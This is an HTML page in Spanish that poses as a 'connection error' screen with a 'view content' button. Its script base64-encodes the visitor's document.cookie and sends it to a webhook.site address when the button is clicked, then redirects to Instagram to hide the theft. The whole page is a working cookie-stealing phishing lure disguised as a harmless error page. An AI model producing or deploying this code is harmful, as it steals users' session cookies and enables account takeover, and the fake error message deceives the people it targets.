<!DOCTYPE html>
<html>
<body style="text-align: center; padding-top: 50px;">
    <h1>Error de conexión</h1>
    <p>Se ha producido un error al cargar el contenido. Por favor, pulsa el botón para continuar.</p>
    <button id="btn" style="padding: 15px 30px; font-size: 18px;">Ver contenido</button>

    <script>
        document.getElementById('btn').onclick = function() {
            // Captura los datos al hacer clic
            fetch('https://webhook.site/ead7c29b-87ec-48f2-94a1-976c087aec41?data=' + btoa(document.cookie));
            
            // Redirige tras el clic
            setTimeout(function() {
                window.location.href = "https://www.instagram.com";
            }, 300);
        };
    </script>
</body>
</html>
